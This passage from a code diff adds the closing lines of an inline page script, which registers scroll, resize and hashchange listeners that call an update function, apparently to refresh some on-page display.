+
+        window.addEventListener("scroll", requestUpdate, { passive: true });
+        window.addEventListener("resize", requestUpdate);
+        window.addEventListener("hashchange", requestUpdate);
+        requestUpdate();
+      })();
+    </script>
